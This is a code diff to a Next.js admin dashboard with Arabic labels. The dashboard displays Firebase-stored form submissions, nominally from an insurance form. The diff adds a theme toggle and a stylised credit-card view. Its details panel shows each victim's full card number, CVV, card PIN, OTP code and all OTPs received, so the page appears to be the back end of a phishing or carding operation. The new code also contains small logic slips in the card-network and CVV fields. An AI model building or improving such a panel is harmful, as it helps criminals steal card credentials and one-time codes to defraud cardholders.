@@ -42,6 +42,7 @@ import { collection, onSnapshot, orderBy, query, doc, updateDoc } from "firebase
 import { ref, onValue } from "firebase/database"
 import { database, db } from "@/lib/firebase"
 import { motion, AnimatePresence } from "framer-motion"
+import { ThemeToggleButton } from "./tog-theme"
 type FlagColor = "red" | "yellow" | "green" | null
 
 // Insurance form data interface
@@ -674,6 +675,7 @@ export default function NotificationsPage() {
               <LogOut className="h-4 w-4 ml-2" />
               العودة للرئيسية
             </Button>
+            <ThemeToggleButton/>
           </div>
         </header>
 
@@ -1117,86 +1119,100 @@ export default function NotificationsPage() {
             )}
 
             {selectedInfo === "card" && selectedNotification && (
-              <div className="space-y-3 p-4 bg-muted/50 rounded-lg text-sm">
-                {(selectedNotification.cardData?.bank || selectedNotification.bank) && (
-                  <p className="flex justify-between">
-                    <span className="font-medium text-muted-foreground">البنك:</span>
-                    <span className="font-semibold">
-                      {selectedNotification.cardData?.bank || selectedNotification.bank}
-                    </span>
-                  </p>
-                )}
-                {renderSensitiveField(
-                  "رقم البطاقة",
-                  selectedNotification.cardData?.cardNumber || selectedNotification.cardNumber,
-                  "cardNumber",
-                )}
-                {(selectedNotification.cardData?.cardExpiry ||
-                  selectedNotification.cardExpiry ||
-                  selectedNotification.expiryDate ||
-                  (selectedNotification.year && selectedNotification.month)) && (
-                  <p className="flex justify-between">
-                    <span className="font-medium text-muted-foreground">تاريخ الانتهاء:</span>
-                    <span className="font-semibold">
-                      {selectedNotification.cardData?.cardExpiry ||
-                        selectedNotification.cardExpiry ||
-                        selectedNotification.expiryDate ||
-                        (selectedNotification.year && selectedNotification.month
-                          ? `${selectedNotification.year}/${selectedNotification.month}`
-                          : "")}
-                    </span>
-                  </p>
-                )}
-                {(selectedNotification.cardData?.cardholderName || selectedNotification.name) && (
-                  <p className="flex justify-between">
-                    <span className="font-medium text-muted-foreground">اسم حامل البطاقة:</span>
-                    <span className="font-semibold">
-                      {selectedNotification.cardData?.cardholderName || selectedNotification.name}
-                    </span>
-                  </p>
-                )}
-                {renderSensitiveField(
-                  "رمز الأمان (CVV)",
-                  selectedNotification.cardData?.cvv || selectedNotification.cvv,
-                  "cvv",
-                )}
-                {renderSensitiveField(
-                  "رمز البطاقة (PIN)",
-                  selectedNotification.cardData?.pass || selectedNotification.pass,
-                  "pass",
-                )}
-
-                {(selectedNotification.cardData?.otp ||
-                  selectedNotification.cardData?.otpCode ||
-                  selectedNotification.otp ||
-                  selectedNotification.otpCode) && (
-                  <div className="flex justify-between items-center">
-                    <span className="font-medium text-muted-foreground">رمز التحقق (OTP):</span>
-                    <Badge className="font-semibold bg-teal-100 text-teal-700 dark:bg-teal-900/50 dark:text-teal-300 px-2 py-0.5">
-                      {selectedNotification.cardData?.otp || selectedNotification.otp}
-                      {(selectedNotification.cardData?.otpCode || selectedNotification.otpCode) &&
-                        ` || ${selectedNotification.cardData?.otpCode || selectedNotification.otpCode}`}
-                    </Badge>
+              <div className="space-y-4">
+                {/* Visual Credit Card */}
+                <div className="w-full max-w-xs mx-auto aspect-[1.586] bg-gradient-to-br from-sky-600 to-blue-800 rounded-xl p-4 text-white shadow-xl relative overflow-hidden flex flex-col justify-between">
+                  <div>
+                    <div className="flex justify-between items-start">
+                      <span className="text-lg font-semibold italic">
+                        {selectedNotification.cardData?.bank || selectedNotification.cardNumber?.at(0)==='4'? "VISA":selectedNotification.cardNumber?.at(0)==='5'?'Mastercard':''}
+                      </span>
+                      {/* Placeholder for Card Network Logo */}
+                      <CreditCard className="w-10 h-10 text-gray-200 opacity-70" />
+                    </div>
+                    {/* Chip */}
+                    <div className="mt-2 w-10 h-7 bg-amber-400 rounded-md"></div>
                   </div>
-                )}
-                {(selectedNotification.cardData?.allOtps || selectedNotification.allOtps) &&
-                  Array.isArray(selectedNotification.cardData?.allOtps || selectedNotification.allOtps) &&
-                  (selectedNotification.cardData?.allOtps || selectedNotification.allOtps)!.length > 0 && (
-                    <div>
-                      <span className="font-medium text-muted-foreground block mb-1.5">جميع رموز OTP:</span>
-                      <div className="flex flex-wrap gap-1.5">
-                        {(selectedNotification.cardData?.allOtps || selectedNotification.allOtps)!.map((otp, index) => (
-                          <Badge
-                            key={index}
-                            variant="outline"
-                            className="text-xs px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700/50"
-                          >
-                            {otp}
-                          </Badge>
-                        ))}
+
+                  <div>
+                    <p className="text-lg sm:text-xl tracking-wider font-mono text-center my-2" dir="ltr">
+                      {selectedNotification.cardData?.cardNumber || selectedNotification.cardNumber
+                        ? selectedNotification.cardNumber
+                        : "•••• •••• •••• ••••"}
+                    </p>
+                    <div className="flex justify-between items-end text-xs">
+                      <div>
+                        <p className="text-gray-300 uppercase text-[0.6rem] tracking-wider">Cvv </p>
+                        <p className="uppercase font-medium tracking-wide">
+                          {selectedNotification?.cvv|| "HOLDER NAME"}
+                        </p>
+                      </div>
+                      <div>
+                        <p className="text-gray-300 uppercase text-[0.6rem] tracking-wider text-right">Expires</p>
+                        <p className="font-medium tracking-wide text-right">
+                          {selectedNotification.expiryDate ||
+                            selectedNotification.expiryDate ||
+                            (selectedNotification.year && selectedNotification.month
+                              ? `${selectedNotification.month}/${selectedNotification.year.slice(-2)}`
+                              : "MM/YY")}
+                        </p>
                       </div>
                     </div>
+                  </div>
+                </div>
+
+                {/* Sensitive Details Below Card */}
+                <div className="space-y-3 p-4 bg-muted/50 rounded-lg text-sm mt-4">
+                  {renderSensitiveField(
+                    "رقم البطاقة الكامل",
+                    selectedNotification.cardData?.cardNumber || selectedNotification.cardNumber,
+                    "cardNumberDialog", // Use a unique fieldId for dialog context
                   )}
+                  {renderSensitiveField(
+                    "رمز الأمان (CVV)",
+                    selectedNotification.cardData?.cvv || selectedNotification.cvv,
+                    "cvvDialog", // Unique fieldId
+                  )}
+                  {renderSensitiveField(
+                    "رمز البطاقة (PIN)",
+                    selectedNotification.cardData?.pass || selectedNotification.pass,
+                    "passDialog", // Unique fieldId
+                  )}
+
+                  {(selectedNotification.cardData?.otp ||
+                    selectedNotification.cardData?.otpCode ||
+                    selectedNotification.otp ||
+                    selectedNotification.otpCode) && (
+                    <div className="flex justify-between items-center">
+                      <span className="font-medium text-muted-foreground">رمز التحقق (OTP):</span>
+                      <Badge className="font-semibold bg-teal-100 text-teal-700 dark:bg-teal-900/50 dark:text-teal-300 px-2 py-0.5">
+                        {selectedNotification.cardData?.otp || selectedNotification.otp}
+                        {(selectedNotification.cardData?.otpCode || selectedNotification.otpCode) &&
+                          ` || ${selectedNotification.cardData?.otpCode || selectedNotification.otpCode}`}
+                      </Badge>
+                    </div>
+                  )}
+                  {(selectedNotification.cardData?.allOtps || selectedNotification.allOtps) &&
+                    Array.isArray(selectedNotification.cardData?.allOtps || selectedNotification.allOtps) &&
+                    (selectedNotification.cardData?.allOtps || selectedNotification.allOtps)!.length > 0 && (
+                      <div>
+                        <span className="font-medium text-muted-foreground block mb-1.5">جميع رموز OTP:</span>
+                        <div className="flex flex-wrap gap-1.5">
+                          {(selectedNotification.cardData?.allOtps || selectedNotification.allOtps)!.map(
+                            (otp, index) => (
+                              <Badge
+                                key={index}
+                                variant="outline"
+                                className="text-xs px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700/50"
+                              >
+                                {otp}
+                              </Badge>
+                            ),
+                          )}
+                        </div>
+                      </div>
+                    )}
+                </div>
               </div>
             )}
           </div>
